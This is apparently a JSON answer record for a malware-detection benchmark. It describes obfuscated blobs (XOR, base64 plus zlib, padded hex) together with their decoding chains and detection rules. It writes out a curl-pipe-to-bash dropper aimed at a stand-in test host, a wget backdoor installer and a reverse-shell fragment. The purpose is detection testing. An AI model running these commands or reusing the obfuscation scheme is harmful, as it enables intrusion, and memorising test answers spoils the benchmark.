@@ -1,0 +1,149 @@
+{
+  "sample_id": "adv-037-random-blob",
+  "category": "entropy_analysis",
+  "description": "Multiple high-entropy blobs combining random-looking data with binary embedding - multi-indicator detection test",
+  "primary_detection": {
+    "codes": ["ENTROPY-001", "ENTROPY-003"],
+    "name": "Combined High Entropy + Binary Embedding",
+    "description": "Random-looking binary blobs that decode to shell scripts and executable code - combines multiple entropy indicators",
+    "indicators": [
+      "SHELL_BLOB: Byte array that decodes to bash script",
+      "XOR_ENCRYPTED_BLOB: XOR-encrypted Python code",
+      "HYBRID_PAYLOAD: Base64 with embedded ELF and commands",
+      "LAYERED_BLOB: Base64 + zlib compressed payload",
+      "RANDOM_HEX_BLOB: Hex dump with random padding",
+      "ENTROPY_PAD: Pure high-entropy random string"
+    ]
+  },
+  "entropy_indicators": {
+    "ENTROPY-001": {
+      "name": "High Entropy Strings",
+      "matches": ["ENTROPY_PAD", "RANDOM_HEX_BLOB (padding section)"],
+      "description": "Strings with entropy >6.0 bits per character"
+    },
+    "ENTROPY-003": {
+      "name": "Binary Data Embedding",
+      "matches": ["SHELL_BLOB", "XOR_ENCRYPTED_BLOB", "LAYERED_BLOB"],
+      "description": "Byte arrays containing executable content"
+    }
+  },
+  "underlying_threats": [
+    {
+      "code": "DROPPER-001",
+      "name": "Shell Script Dropper",
+      "description": "SHELL_BLOB decodes to curl | bash pipeline",
+      "decoded_content": "#!/bin/bash\\ncurl -s https://blob.BENCHMARK_TEST_ONLY.[REDACTED].example.com/stage2 | bash",
+      "severity": "critical"
+    },
+    {
+      "code": "CRYPTO-001",
+      "name": "XOR Encrypted Payload",
+      "description": "XOR_ENCRYPTED_BLOB uses single-byte XOR (key: 0x42)",
+      "decoded_content": "Python socket reverse shell",
+      "severity": "critical"
+    },
+    {
+      "code": "HYBRID-001",
+      "name": "Hybrid Binary/Script",
+      "description": "HYBRID_PAYLOAD contains ELF header + embedded awk command",
+      "severity": "critical"
+    },
+    {
+      "code": "LAYER-001",
+      "name": "Multi-Layer Encoding",
+      "description": "LAYERED_BLOB requires base64 decode + zlib decompress",
+      "decoded_content": "python3 -c 'import socket,subprocess,os;...'",
+      "severity": "critical"
+    },
+    {
+      "code": "BACKDOOR-002",
+      "name": "Hex-Encoded Backdoor",
+      "description": "RANDOM_HEX_BLOB decodes to wget backdoor installer",
+      "decoded_content": "wget ... -O /tmp/.hidden.sh && chmod 755 ... && /tmp/.hidden.sh",
+      "severity": "critical"
+    }
+  ],
+  "entropy_analysis": {
+    "SHELL_BLOB": {
+      "size_bytes": 98,
+      "estimated_entropy_bits": 4.8,
+      "content_type": "shell_script",
+      "decoded_preview": "#!/bin/bash\\ncurl -s https://..."
+    },
+    "XOR_ENCRYPTED_BLOB": {
+      "size_bytes": 62,
+      "estimated_entropy_bits": 5.6,
+      "encryption": "single_byte_xor",
+      "xor_key": "0x42",
+      "appears_random": true
+    },
+    "HYBRID_PAYLOAD": {
+      "encoded_length": 384,
+      "estimated_entropy_bits": 5.9,
+      "contains_elf_header": true,
+      "embedded_command": true,
+      "entropy_padding": true
+    },
+    "LAYERED_BLOB": {
+      "encoding_layers": ["zlib", "base64"],
+      "estimated_entropy_bits": 6.4,
+      "decoded_type": "shell_command"
+    },
+    "RANDOM_HEX_BLOB": {
+      "total_lines": 6,
+      "payload_lines": 4,
+      "padding_lines": 2,
+      "estimated_entropy_bits": 5.2,
+      "padding_entropy_bits": 5.8
+    },
+    "ENTROPY_PAD": {
+      "length": 350,
+      "estimated_entropy_bits": 5.7,
+      "pattern": "structured_alphanumeric",
+      "purpose": "entropy_inflation"
+    }
+  },
+  "decoding_chains": {
+    "SHELL_BLOB": "bytes() -> decode('ascii') -> shell script",
+    "XOR_ENCRYPTED_BLOB": "bytes() -> XOR(0x42) -> decode() -> exec()",
+    "HYBRID_PAYLOAD": "base64.decode() -> extract embedded command -> subprocess",
+    "LAYERED_BLOB": "base64.decode() -> zlib.decompress() -> decode() -> subprocess",
+    "RANDOM_HEX_BLOB": "split() -> join() -> bytes.fromhex() -> decode() -> subprocess"
+  },
+  "detection_confidence": {
+    "entropy_detection": 0.96,
+    "binary_detection": 0.94,
+    "encryption_detection": 0.91,
+    "multi_layer_detection": 0.93,
+    "malicious_intent": 0.98,
+    "overall": 0.96
+  },
+  "verdict": "确认恶意",
+  "verdict_reasoning": "Comprehensive malware sample combining multiple entropy and binary indicators: XOR encryption, base64+zlib layering, hex encoding with random padding, binary embedding. All decode to malicious payloads (backdoors, reverse shells, droppers)",
+  "recommended_actions": [
+    "Detect byte arrays with shell script patterns (#!/bin/bash)",
+    "Identify XOR encryption by entropy + repetitive patterns",
+    "Scan for multi-layer encoding (base64 containing zlib)",
+    "Detect hex strings with high-entropy padding",
+    "Block any code calculating its own entropy (anti-analysis)",
+    "Flag files with multiple high-entropy blobs"
+  ],
+  "benchmark_metadata": {
+    "test_type": "BENCHMARK_TEST_ONLY",
+    "domains_used": [
+      "blob.BENCHMARK_TEST_ONLY.[REDACTED].example.com",
+      "hybrid.BENCHMARK_TEST_ONLY.[REDACTED].example.com",
+      "random.BENCHMARK_TEST_ONLY.[REDACTED].example.com",
+      "universal.BENCHMARK_TEST_ONLY.[REDACTED].example.com"
+    ],
+    "created_for": "Multi-indicator entropy detection validation",
+    "entropy_indicators_tested": ["ENTROPY-001", "ENTROPY-003"],
+    "combined_techniques": [
+      "High entropy strings",
+      "Binary data embedding",
+      "XOR encryption",
+      "Multi-layer encoding",
+      "Hex encoding with padding"
+    ]
+  }
+}
